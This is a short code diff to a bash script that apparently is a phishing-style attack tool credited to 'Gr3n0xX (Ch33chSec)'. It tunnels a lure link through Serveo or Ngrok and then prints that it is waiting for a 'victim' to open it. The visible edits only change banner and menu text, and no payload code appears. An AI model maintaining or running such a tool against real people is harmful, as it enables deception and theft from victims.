@@ -67,7 +67,7 @@ echo -e "$R ╔╝$W█$R╚══╦═╦══╦╩═╦═╦═╩╝"
 echo -e "$R╔╝$W█████$R║$W█$R║$W██$R║$W██$R║$W█$R║"
 echo -e "$R║$W██████$R║$W█████████$R║\033[00m"
 echo
-printf "      \e[1;97m    Version 1.5 Beta      \e[0m\n"
+printf "      \e[1;97m  .:.  Version 1.5 Beta  .:.   \e[0m\n"
 printf "\n"
 printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX (Ch33chSec)\e[0m\n"
 printf "\n"
@@ -383,7 +383,7 @@ echo -e "$blue
              \n"
 echo
 echo
-printf "      \e[1;97m    Version 1.5 Beta      \e[0m\n"
+printf "      \e[1;97m  .:.  Version 1.5 Beta  .:.  \e[0m\n"
 printf "\n"
 printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX (Ch33chSec)\e[0m\n"
 printf "\n"
@@ -893,7 +893,7 @@ fi
 
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunelling, Best!)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
@@ -914,7 +914,7 @@ fi
 checkfound() {
 
 printf "\n"
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ctrl + c to exit...\e[0m\n"
 while [ true ]; do
 
 
